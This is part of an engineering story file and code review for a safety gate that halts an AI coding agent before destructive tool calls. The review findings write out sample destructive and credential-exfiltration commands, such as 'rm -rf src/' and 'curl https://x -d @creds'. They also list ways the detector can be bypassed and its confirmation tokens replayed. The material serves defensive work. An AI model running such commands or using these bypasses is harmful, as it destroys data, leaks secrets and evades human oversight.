  - **(b) Detect on a journaled tool-call-intent the dispatcher records pre-execution, then let the post-dispatch `check_stop` fire before the NEXT iteration dispatches.** The dispatcher writes a `tool_call_intent` journal entry before execution; the `high_risk_path` `StopTrigger.check()` reads it from disk. **Weaker — the first destructive call may slip** (the intent is journaled but the op can execute in the same iteration before the post-dispatch check; or if the intent is journaled *and* execution deferred, you've re-implemented (a) the hard way). Adds a net-new journal kind for the intent. Does not cleanly satisfy "dispatch never happens".
  - **(c) Pure post-dispatch `StopTrigger.check(repo_root, state)` registered into `_ORDERED_TRIGGERS` (the vanilla 4.3–4.6 pattern).** **Rejected — fires after the op already ran** (C2). This is exactly the false-negative the SECURITY-SENSITIVE designation forbids. Only viable if the op's *effect* (not the op itself) is what we halt on — which contradicts the AC's "dispatch never happens".

- **DH2 — Registry priority order (where does `high_risk_path` sit in `_ORDERED_TRIGGERS`?).** 4.2 froze `check_stop` as **first-fired** (`stop_registry.py:33–39`); the tuple order is a reviewable artifact (DAG D1). 4.7 appends one line. **Note:** if DH1(a) is chosen, the *halt* is produced by the dispatcher gate path, so the engine-side trigger's registry position governs only the post-dispatch `check_stop` ordering relative to siblings — still a reviewable safety choice.
  - **(a) Sort `high_risk_path` to HIGHEST priority (first in the tuple).** Safety-first: if a high-risk op coincides with another fired trigger, the destructive-op halt should win the `reason` reported to the user — it is the most safety-critical signal. Argues the safety case explicitly; the order becomes a documented, reviewable artifact. **(Recommended — argue the safety case; default story-order would place it 6th.)**
  - **(b) Append in story-number order (6th, after 4.2–4.6).** Matches the default convention 4.2 documented ("Stories 4.3-4.9 append new triggers to this tuple"). Simpler, no special-casing, but a high-risk halt could be masked by an earlier-listed trigger firing first. Lower safety signal.

- **DH3 — Confirmation token/seam for `--confirm-tool-call <id>` (AC3).** The AC says "`--confirm-tool-call <id>` or equivalent"; the `<id>` semantics and where the confirmation state lives are undefined in the artifacts.
  - **(a) Reuse the 2B.6 per-dispatch nonce-echo gate as the confirmation primitive.** 2B.6 already implements `prompt_for_reconfirmation(nonce, ...)` (`safety.py:180`) — an interactive TTY nonce echo. For auto-mode's non-interactive resume, the "confirmation" is the `--confirm-tool-call <id>` flag carrying a token that matches the halted op's recorded identifier; on match the op proceeds and `high_risk_confirmed` is journaled. Reuses the audited 2B.6 confirmation semantics; `<id>` = a stable identifier of the halted tool call (e.g. the `correlation_id` or a content hash of the tool-call excerpt). **(Recommended.)**
  - **(b) A `.claude/state/` confirmation marker file** the user creates/`sdlc` writes to mark a specific tool-call id as confirmed; the resume reads its presence (pure-fn-of-disk, mirrors 4.2's clarification-presence model). Cleaner pure-disk resume, but introduces a new on-disk shape + lifecycle to define and test.
  - **(c) Defer the exact `<id>` derivation to review-B (`security-reviewer`)** — implement the journaling + the no-confirm "dispatch never happens" invariant first, and let the security reviewer ratify the token scheme (replay-resistance, scope). Acceptable given SECURITY-SENSITIVE; record as a review-B decision rather than blocking DH0.

---

## Dev Agent Record

### Context Reference

<!-- Path(s) to story context JSON/XML will be added here by context workflow -->

### Agent Model Used

Composer (Cursor Agent)

### Debug Log References

- DH0: DH1(a) bridge `_run_member` auto-loop gate → `destructive_op_rejected{auto_loop_halt}` → `HighRiskPathTrigger` → frozen `stop_triggered`; DH2(a) first in registry; DH3(a) `compute_tool_call_id` + `--confirm-tool-call`.
- Local gates green: ruff, mypy (changed modules), module-boundaries, freeze 7/7, mkdocs --strict.
- Full pytest blocked on this Windows host (POSIX-only `io_primitives` import); targeted suite must run on POSIX CI before merge.

### Completion Notes List

- Implemented STOP trigger 6 (`high_risk_path`) with pre-execution interception via `auto_loop_mode` in `_run_member` (before `atomic_write`).
- Added `secret_exfil` pattern, `compute_tool_call_id`, `HighRiskPathTrigger` (registry priority #1), `high_risk_confirmed` ADR-028 row, CLI `--confirm-tool-call`.
- Unit + integration 4-cell matrix × 4 adversarial patterns; registry-priority assertion; no `auto_loop.py`/`projection.py` edits.

### File List

- `src/sdlc/engine/stop_high_risk.py` (new)
- `src/sdlc/engine/stop_registry.py` (modified)
- `src/sdlc/dispatcher/safety.py` (modified)
- `src/sdlc/dispatcher/_panel_helpers.py` (modified)
- `src/sdlc/dispatcher/core.py` (modified)
- `src/sdlc/cli/auto.py` (modified)
- `src/sdlc/cli/_auto_register.py` (modified)
- `docs/decisions/ADR-028-journal-kind-taxonomy.md` (modified)
- `tests/unit/engine/test_stop_high_risk.py` (new)
- `tests/integration/stop_triggers/test_stop_high_risk.py` (new)
- `tests/unit/dispatcher/test_safety.py` (modified)
- `_bmad-output/implementation-artifacts/sprint-status.yaml` (modified)
- `_bmad-output/implementation-artifacts/4-7-stop-trigger-6-high-risk-path-detected.md` (modified)

---

## Change Log

- 2026-06-18: Story drafted (create-story) — STOP trigger 6 (high-risk path detected), the SECURITY-SENSITIVE Layer-2 story (DAG §4 top-2 risk). Authored after the Layer-2 precondition was verified: **4.1 `done` + 4.2 `done`** (close-out `e539d5f`, registry seam frozen on `main`), freeze 7/7, the `_reset_stop_trigger_registry` isolation fixture and `stop_triggered`/projection-fold machinery on `main`. First-hand verification of every load-bearing seam (`StopDecision`/`StopTrigger` frozen 4 fields; `_ORDERED_TRIGGERS` append point; `auto_loop.py:276/286` POST-dispatch check vs the AC's pre-execution requirement; the 2B.6 `_run_member` AC3 pre-execution gate + `safety.py` classifier covering 3 of 4 patterns; `module_boundary_table.py:95/105` `dispatcher ↛ engine` directionality; `high_risk_confirmed` net-new + zero-hits; `AgentResult.tool_calls` frozen shape). Surfaced 8 binding corrections (C1 detect-halt-record scope; **C2 the headline post-dispatch-vs-pre-execution tension — false-negative = unconfirmed `rm -rf src/`**; C3 the existing 2B.6 gate to REUSE; C4 module-boundary directionality pinning the seam; **C5 the +1 ADR-028 `high_risk_confirmed` kind — the ONE vanilla-exception, confirm-path only**; C6 the 4-field `StopDecision` pack; C7 the reused 4.2 halt/fold verbatim; C8 LOC/imports/mock/shared-file) and 3 decisions (DH1 interception seam — recommend bridging the 2B.6 gate; DH2 registry priority — recommend safety-first highest; DH3 confirmation token — recommend reuse the 2B.6 nonce primitive). Route review-B through `security-reviewer` (DAG §7). Status: ready-for-dev.
- 2026-06-21: DH0 resolved (dev-story) — **DH1(a)**: bridge `_run_member` pre-execution gate (`auto_loop_mode`) → journal `destructive_op_rejected{auto_loop_halt}` → engine `HighRiskPathTrigger` → frozen `stop_triggered{high_risk_path}` halt; skip `stop_trigger_raised` on `DispatchError.details["high_risk_path_halt"]`. **DH2(a)**: `HighRiskPathTrigger` first in `_ORDERED_TRIGGERS` (safety-first). **DH3(a)**: `--confirm-tool-call <id>` where `<id>` = `compute_tool_call_id(tool_call)` (sha256 of normalized name+command); match → journal `high_risk_confirmed` + proceed.
- 2026-06-21: bmad-code-review (fresh-context) — 4 adversarial layers at Opus-4.8 (Blind Hunter / Edge Case Hunter / Acceptance Auditor / **security-reviewer** per DAG §7 SECURITY-SENSITIVE mandate) + direct source verification. **0 VIOLATED** constraints (C2 pre-execution invariant holds at the dispatcher seam: `raise DispatchError` @ `_panel_helpers.py:713` precedes `atomic_write` @:786; C4 `dispatcher ↛ engine` clean; C7 freeze 7/7 — `auto_loop.py`/`projection.py`/`stop_triggers.py` untouched; DH1/DH2/DH3 MET). Triage: 2 decision · 2 patch · 5 defer · 7 dismissed → resolved user `all recommend`: **D1 → DEFER** (production auto-loop never arms the gate; same `EPIC-4-DEBT-AUTO-REAL-DISPATCH` boundary as 4.6 CR4.6-W2 → CR4.7-W6); **D2 → DEFER + xfail** (confirmation token replay/global-suppression/dead-nonce/multi-finding deadlock; not production-reachable until D1; seq-bound redesign lands with the real wiring → CR4.7-W7). **P1/P2 APPLIED + verified** (`safety.py`: id-normalization skew + audit `target` extraction; ruff/format/mypy --strict green, 15/15 standalone assertions, no fixture regression). **Defers W1/W2** (secret_exfil + pre-existing pattern misses → CR2B6-W1 catalogue), **W3** (JournalError fail-open → reviewed cross-cutting posture, matches `stop_agent_failed.py:93` + all 5 sibling triggers), **W4** (auto-mode lock omission — verify concurrency model), **W5** (Bash-only detection → 2B.6 scope). **STAYS `review`** — flips to `done` only after TDD-first commit (`test(4.7)`→`feat(4.7)`) + merge + green POSIX CI per the merged-before-done gate (Epic-3 retro A1); full pytest is blocked on the Windows host (POSIX-only `io_primitives`).

---

### Review Findings

> **bmad-code-review (2026-06-21, fresh-context)** — 4 adversarial layers at Opus-4.8 (Blind Hunter / Edge Case Hunter / Acceptance Auditor / **security-reviewer** per DAG §7 SECURITY-SENSITIVE mandate) + direct source verification. Acceptance Auditor: **0 VIOLATED** (C2 pre-execution invariant holds at the dispatcher seam; C4 `dispatcher ↛ engine` clean; C7 freeze 7/7 — `auto_loop.py`/`projection.py`/`stop_triggers.py` untouched; DH1/DH2/DH3 MET). Triage: 2 decision-needed · 2 patch · 5 defer · 7 dismissed.

**Decision-needed — RESOLVED 2026-06-21 (`all recommend`) → both DEFER:**

- [x] **[Review][Defer] CR4.7-D1 — Production auto-loop never arms the high-risk gate (gate proven only via the test dispatch_fn)** — **RESOLVED → DEFER (option a).** The dispatcher `auto_loop_mode` seam + the 4-cell × 4-pattern matrix are green, but they exercise the integration test's bespoke `_make_high_risk_dispatch_fn` (passes `auto_loop_mode=True`). Production `cli/auto.py:_make_task_dispatch_fn` calls `run_task(...)` — never `dispatch(auto_loop_mode=True)` — and `run_auto` hard-aborts on the real runtime (`ERR_AUTO_LOOP_REAL_DISPATCH_DEFERRED`, `EPIC-4-DEBT-AUTO-REAL-DISPATCH`). So on the shipped `sdlc auto` path no `destructive_op_rejected{auto_loop_halt}` is ever written and `HighRiskPathTrigger.check` always returns `fired=False`. **Same deferred boundary as 4.6 CR4.6-W2** ("not production-reachable until real auto-loop dispatch lands"). Sources: Acceptance Auditor (AC1-gap) + security-reviewer (C1, BLOCK). **Deferred reason:** production wiring lands with `EPIC-4-DEBT-AUTO-REAL-DISPATCH`, consistent with the Epic-4 STOP-fan-out seam pattern and the 4.6 precedent — the dispatcher seam + 4-cell matrix are proven; real auto-dispatch is a known stub. Tracked as CR4.7-W6 in deferred-work.md.
- [x] **[Review][Defer] CR4.7-D2 — Confirmation/resume token integrity (replay + global-for-all-time suppression + dead `nonce_sha256` + multi-finding deadlock)** [src/sdlc/dispatcher/safety.py:401-406, src/sdlc/engine/stop_high_risk.py:55-68] — **RESOLVED → DEFER (option b) + `xfail`.** `compute_tool_call_id = sha256(name\0command)` is a pure content hash with **no seq/nonce/block binding**; `_confirmed_tool_call_ids` folds the *entire* journal history, so a legit `high_risk_confirmed` permanently suppresses *every* future byte-identical destructive call (replay/resurrection). `nonce_sha256` is journaled but never checked (dead defense-in-depth). The dispatcher confirm is all-or-nothing on a single id: a 2+-finding `AgentResult` with distinct ids can never be confirmed (liveness deadlock), while identical-command duplicates are over-released by one token. Sources: Blind Hunter (H) + Edge Case Hunter (Critical) + security-reviewer (C3/H2/L1). **Deferred reason:** not production-reachable until CR4.7-D1; the seq-bound consume-once redesign should land WITH the production wiring so it is designed against the real path, not the mock — ship an `xfail` documenting the global-suppression replay (mirrors 4.6 CR4.6-W2). CR4.7-P1 still fixes the id-skew regardless. Tracked as CR4.7-W7 in deferred-work.md.

**Patch — APPLIED + verified 2026-06-21 (`safety.py` only; ruff/format/mypy --strict green; 15/15 standalone assertions pass, no fixture regression):**

- [x] **[Review][Patch] CR4.7-P1 — `compute_tool_call_id` hashes RAW command while detection uses NORMALIZED** [src/sdlc/dispatcher/safety.py:401-406] — `is_destructive`/`extract_destructive_target` match on `_normalize_command(...)`, but `compute_tool_call_id` hashed the raw `command`. NFKC/whitespace-equivalent variants → id ≠ what detection re-derives → confirm-never-matches (DoS) or journaled excerpt ≠ id basis. **Fix applied:** coerce via `_safe_command_str` + `_normalize_command` (and `name` → str) before hashing; verified `"  rm -rf src/"` now yields the same id as `"rm -rf src/"`, missing-command no longer stringifies `"None"`. (Would be subsumed if CR4.7-W7 redesign lands; valid standalone regardless.)
- [x] **[Review][Patch] CR4.7-P2 — Audit `target` extraction wrong on real destructive events** [src/sdlc/dispatcher/safety.py:414-424] — `DROP TABLE IF EXISTS users` → `target="IF"`; `git push origin main --force` → `target="main/--force"` (positional `parts[-2]/parts[-1]`). Misleading forensics on the exact event most needing accuracy. **Fix applied:** `_target_from_drop_database` skips an optional `IF [NOT] EXISTS` clause; `_target_from_force_push` derives remote/ref from the first non-flag tokens after `push` (arg-order-independent). Existing asserted targets (`origin/main`, `users`, `src/`, exfil URL) all preserved; audit-only (`StopDecision.target`), halt decision unchanged.

**Defer (pre-existing / cross-cutting / out-of-scope):**

- [x] **[Review][Defer] CR4.7-W1 — `secret_exfil` regex bypasses + possible ReDoS** [src/sdlc/dispatcher/safety.py:389-393] — no `re.DOTALL` (multi-line/heredoc curl evades); URL-first `curl https://x -d @creds` and var/base64 indirection slip both alternations; `.*…​.*` with alternation is a backtracking risk. The AC mandates only the named fixture (which passes); secret-exfil breadth is explicitly **CR2B6-W1** catalogue-expansion debt. Deferred to CR2B6-W1.
- [x] **[Review][Defer] CR4.7-W2 — Pre-existing destructive-pattern misses** [src/sdlc/dispatcher/safety.py:124-126] — `git push origin main --force` / `-f`, `git push +ref`, `rm -r -f` / `--recursive --force`, `TRUNCATE`/`DELETE FROM` evade the 2B.6 patterns (not introduced by 4.7). Already tracked as **CR2B6-W1**. Deferred.
- [x] **[Review][Defer] CR4.7-W3 — `HighRiskPathTrigger.check` fails OPEN on `JournalError`/missing journal** [src/sdlc/engine/stop_high_risk.py:618-621] — `except JournalError: return StopDecision(fired=False)`. **Matches the reviewed cross-cutting posture** — identical to `stop_agent_failed.py:93` (D-R2/P3, accepted) and all 5 sibling triggers; the in-band `DispatchError` is the real safety boundary, the journal read is a secondary confirmation. If fail-closed is wanted it is a decision for ALL 6 triggers, owned outside 4.7. Deferred (cross-cutting).
- [x] **[Review][Defer] CR4.7-W4 — `DESTRUCTIVE_PAUSE_LOCK` not held in the `auto_loop_mode` emit branch** [src/sdlc/dispatcher/_panel_helpers.py:670-708] — the interactive branch serializes journal emits under the lock; the new auto branch does not. Potential seq-ordering hazard IF auto-mode dispatches panel members concurrently. Low production reachability (gated by D1). Deferred pending a concurrency-model check.
- [x] **[Review][Defer] CR4.7-W5 — Detection scoped to `name == "Bash"` only** [src/sdlc/dispatcher/safety.py:174-176] — non-Bash tools (Write/Edit/MCP) are never classified destructive. Pre-existing 2B.6 v1 scope (documented in the substrate map). Deferred to the destructive-catalogue / tool-coverage owner.

**Dismissed (noise / handled / verified-safe):** `evaluate_queued_tool_call` "mirrors" claim (tested, harmless mapping doc); copy-paste tool-extraction in the two auto branches (DRY style, no behavior bug); `build_high_risk_reason` unbounded length (no length contract on `reason`); `monotonic_seq` strict-`>` tie (uniqueness guaranteed by ADR-032 `append_with_seq_alloc` in production); `auto_loop_halt is not True` JSON round-trip (verified by passing test; pydantic preserves bool); `core.py` parallel-branch double-negative (correct as written — `first_exc` may be non-`DispatchError`; auditor verified the DH1 bridge); `_target_from_secret_exfil` trailing metachars (cosmetic, folds into W1).
